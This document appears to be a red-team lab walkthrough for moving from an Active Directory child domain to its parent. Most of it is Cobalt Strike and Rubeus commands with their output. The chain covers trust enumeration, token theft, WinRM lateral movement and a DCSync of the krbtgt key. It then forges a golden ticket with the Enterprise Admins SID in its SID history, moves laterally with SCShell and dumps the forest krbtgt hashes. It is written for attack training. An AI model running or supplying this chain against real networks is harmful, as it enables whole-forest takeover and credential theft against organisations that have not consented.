# Parent Child Trusts Lab  

>The objective for this lab is to hop from a child domain to its parent.

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Interact with the Beacon and enumerate the trust.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
    ```

⚠️ results
 
    > - trustDirection 3 is TRUST_DIRECTION_BIDIRECTIONAL
    > - trustAttributes 32 is TRUST_ATTRIBUTE_WITHIN_FOREST

3. Obtain the domain SID for the child domain.

	```Beacon-nocolor
    ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
    ```

⚠️ This should return *S-1-5-21-690277740-3036021016-2883941857*.

4. Obtain the SID for parent domain's Enterprise Admins group.

	```Beacon-nocolor
    ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
    ```
	
⚠️ This should return *S-1-5-21-3926355307-1661546229-813047887-519*.

===

## Credential Access

1. Impersonate the *sguest* user.

```
ps
process_browser
steal_token 6268
getuid
krb_triage
ls \\dub-dc-1\c$
```

⚠️ This user is a domain admin in the child Dublin domain.

## Lateral Movement to Dublin Ireland  

```
jump winrm64 dub-dc-1 smb
```

## Privilege Escalation + Persistence

1. Switch to the `dub-dc-1` beacon.
2. Obtain the AES256 hash for the child domain's krbtgt account.

```
krb_triage
dcsync dublin.contoso.com DUBLIN\krbtgt
```

>dcsync output

```
<snip>


Object Security ID   : S-1-5-21-690277740-3036021016-2883941857-502
Credentials
      aes256_hmac       (4096) : 2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
<snip>
```

## Golden Exploitation

1. On the Attacker Desktop, forge a golden ticket and output to a kirbi file.

    ```Terminal-nocolor
    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
    ```

2. Inject the Golden ticket into the Beacon session.

```Beacon-nocolor
kerberos_ticket_use C:\Users\Attacker\Desktop\golden_2026_04_29_06_43_02_Administrator_to_krbtgt@DUBLIN.CONTOSO.COM
```

⚠️ This will replace the current TGT for `sguest`.

3. Verify the ticket is in the session.
```
getuid
run klist
krb_triage
```

4. Access the parent domain's domain controller.
```
ls \\lon-dc-1\c$
```

## Lateral Movement to London from Ireland  

>load 🔄 script manager CNA `C:\Tools\SCShell\CS-BOF\scshell.cna` for `scshell64`  
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-dc-1 smb
```
  
## Forest and Domain Dominance  

```
getuid
dcsync contoso.com CONTOSO\krbtgt
```

>DCsync output:  
```
** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 24/01/2025 14:50:53
Object Security ID   : S-1-5-21-3926355307-1661546229-813047887-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 2d454c2120b54890b3db65406e5a5974
    ntlm- 0: 2d454c2120b54890b3db65406e5a5974
    lm  - 0: 6666c48c4b440676cfda7be586409948

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 1a8b1df83c2cdbeadba591130490e21d

* Primary:Kerberos-Newer-Keys *
    Default Salt : CONTOSO.COMkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
```

⚠️ In this lab, you have forged a golden ticket using SID history to impersonate an enterprise admin, and hop a parent-child trust.

